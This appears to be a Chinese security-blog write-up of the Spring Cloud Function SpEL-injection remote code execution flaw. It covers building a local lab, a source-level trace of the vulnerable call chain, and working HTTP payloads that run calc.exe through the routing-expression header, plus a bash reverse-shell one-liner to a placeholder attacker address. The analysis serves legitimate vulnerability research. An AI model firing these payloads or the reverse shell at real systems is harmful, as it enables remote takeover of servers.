# 简介

Spring Cloud功能特点

![image-20220403143623101.png](https://image.3001.net/images/20220505/1651714749_62732abdc3613c6377577.png!small)

# 影响版本

3.0.0.M3 <= Spring Cloud Function <=3.2.2

# 漏洞复现

## 环境搭建

选择版本为V3.1.6

根据Tags的更新时间选择，还是选择3.1.6比较稳妥，使用IDEA导入项目

![image-20220401212613169.png](https://image.3001.net/images/20220505/1651714750_62732abeece6188a07de6.png!small)

jar包的下载确实很慢，真是麻了。实际上不用下载那么多jar包，确实用不到，导入项目于

`\spring-cloud-function-3.1.6\spring-cloud-function-3.1.6\spring-cloud-function-samples\function-sample-pojo`修改配置文件`spring-cloud-function-3.1.6\spring-cloud-function-3.1.6\spring-cloud-function-samples\function-sample-pojo\src\main\resources\appliaction.properties`添加

    
    
    spring.cloud.function.definition:functionRouter

![image-20220402110243791.png](https://image.3001.net/images/20220505/1651714751_62732abfcf0f7a44ed41a.png!small)

配置maven启动项目

![image-20220402110326017.png](https://image.3001.net/images/20220505/1651714752_62732ac06513ed5de8e00.png!small)

![image-20220402110354865.png](https://image.3001.net/images/20220505/1651714753_62732ac11c579a61bfc09.png!small)

> [http://127.0.0.1:8080](http://127.0.0.1:8080/)

![image-20220402110436556.png](https://image.3001.net/images/20220505/1651714754_62732ac23e54cc9465f0d.png!small)

# 利用

构造`payload`

    
    
    POST /Ggoodstudy HTTP/1.1  
    Host: 127.0.0.1:8080  
    spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc.exe")  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Accept-Encoding: gzip, deflate  
    Content-Length: 4  
    ​  
    gdsf

![image-20220403144205124.png](https://image.3001.net/images/20220505/1651714754_62732ac2d0a9b6d1e5e6d.png!small)

这不就吐了么，修改配置文件才能RCE????

![image-20220403205706193.png](https://image.3001.net/images/20220505/1651714755_62732ac3c1e2fddf66ff2.png!small)

但是修改路由，当路由指定为`functionRouter`的时候，不修改配置文件已经可以执行恶意payload

    
    
    POST /functionRouter HTTP/1.1  
    Host: 127.0.0.1:8080  
    spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc.exe")  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Accept-Encoding: gzip, deflate  
    Content-Length: 14  
    ​  
    dfdfijkghjkg

![image-20220402105622478.png](https://image.3001.net/images/20220505/1651714756_62732ac46913f5d4d3c8d.png!small)

POST请求且必须传参。

反弹shell

> bash -i >& /dev/tvp/xx.xxx.xx.xx/port 0>&1

进行base64编码，由于这里我使用的是windows环境，所以无法使用反弹shell，具体需要对反弹shell命令进行编码的原因在分析`CVE-2018-1270`的时候已经分析过了。

![image-20220403205921339.png](https://image.3001.net/images/20220505/1651714757_62732ac569b36af5a2d61.png!small)

# 漏洞分析

首先我们需要了解到spring框架中比较常见的几个jar包

  * spring-beans

所有应用都要用到的，它包含访问配置文件、创建和管理bean 以及进行Inversion of Control / Dependency
Injection（IoC/DI）操作相关的所有类。

  * spring-Expression

进行SpEL表达式解析

  * spring-core

Spring 框架基本的核心工具类。Spring 其它组件要都要使用到这个包里的类，是其它组件的基本核心

  * spring-jdbc

存放对jdbc数据库数据访问所有相关的类

  * spring-messaging

api以及协议接口

  * spring-context

为Spring核心提供了大量扩展。可以找到使用Spring ApplicationContext特性时所需的全部类等

  * spring-web

包含Web 应用开发时，用到Spring 框架时所需的核心类，包括自动载入Web Application Context 特性的类、Struts 与JSF
集成类、文件上传的支持类、Filter 类和大量工具辅助类。

  * pring-webmvc

包含Spring MVC 框架相关的所有类。包括框架的Servlets，Web MVC框架，控制器和视图支持。

## 向上查找利用链

SpEL表达式的内容是在`spring-expression`中处理的,在`RoutingFunction`类中调用

![image-20220403135602783.png](https://image.3001.net/images/20220505/1651714758_62732ac6689d1b3878809.png!small)

这里会取出`spring.cloud.function.routing-expression:`属性的spel表达式

![image-20220402125700409.png](https://image.3001.net/images/20220505/1651714759_62732ac73cdd961756351.png!small)

这个方法属于布尔型的判断，这里的属性构造在请求头内，调用了`apply`方法

![image-20220402131335916.png](https://image.3001.net/images/20220505/1651714759_62732ac7e649045d04e37.png!small)

继续向上分析

![image-20220403232506444.png](https://image.3001.net/images/20220505/1651714760_62732ac89e0aab0c0f6f2.png!small)

到达`SimpleFunctionRegistry.java`类的698行，这个apply的方法的触发时

![image-20220403232638460.png](https://image.3001.net/images/20220505/1651714761_62732ac996b076b362c77.png!small)

是在646行定义的，且调用方法`doapply`，而`doapply`也在apply方法中调用了，在往上查找就到了`FunctionWebRequestProcessingHelper`类的`processRequest`方法

![image-20220403232852540.png](https://image.3001.net/images/20220505/1651714762_62732aca541dc1ae80cf0.png!small)

继续向上查找，到了控制层了，到此为止我们的向上查找已经结束，利用链很强清晰，那么对不对呢，我们使用向下查找利用链来做验证，请看下文

## 向下查找利用链

控制层传入数据首先查找路由，在`control`层的定位在`FunctionControl`类中的74行

![image-20220403224118813.png](https://image.3001.net/images/20220505/1651714763_62732acb54869205b0f2a.png!small)

调用`FunctionWebRequestProcessingHelper`类中的http请求参数方法`processRequest`

![image-20220403224410232.png](https://image.3001.net/images/20220505/1651714764_62732acc020c71866c8cc.png!small)

可以看到`processRequest`方法会获取到我们构造payload的方法，在方法为`RoutingFunction`的情况下会直接调用RoutingFunction类中的applay方法

![image-20220403230139777.png](https://image.3001.net/images/20220505/1651714764_62732accaa16a1a9aa705.png!small)

此时我们可以看到这里调用了`Route`方法

![image-20220403230252876.png](https://image.3001.net/images/20220505/1651714765_62732acda8318b0c8129c.png!small)

而在该方法中会读取构造的请求头`spring.cloud.function.routing-expression`属性的值，调用了方法`functionFormExpression`，但是在该方法中的`parseExpression`方法会对SpEL表达式进行解析

![image-20220403231034277.png](https://image.3001.net/images/20220505/1651714766_62732ace82fd2dd3b30b3.png!small)

![image-20220403231137695.png](https://image.3001.net/images/20220505/1651714767_62732acfe84f42e52de42.png!small)

那么我们在调试的过程中

![image-20220403231320620.png](https://image.3001.net/images/20220505/1651714768_62732ad0dfa486f6d240c.png!small)

getValue方法执行的又是什么呢？

> 这里自然是执行的传入的paylaod的内容以及执行解析后的表达式

到这里我们能够发现两条链刚好是对称的，说明分析没有问题。

# 总结

分析了spring-cloud-function可以发现，spring框架的几个由SpEL表达式注入造成的RCE的触发点基本上都很相似，触发类以及触发路由分析对于漏洞挖掘来说都有可以借鉴的地方。

 **更多网安技能的在线实操练习，[请点击这里>>﻿](https://www.hetianlab.com/)**

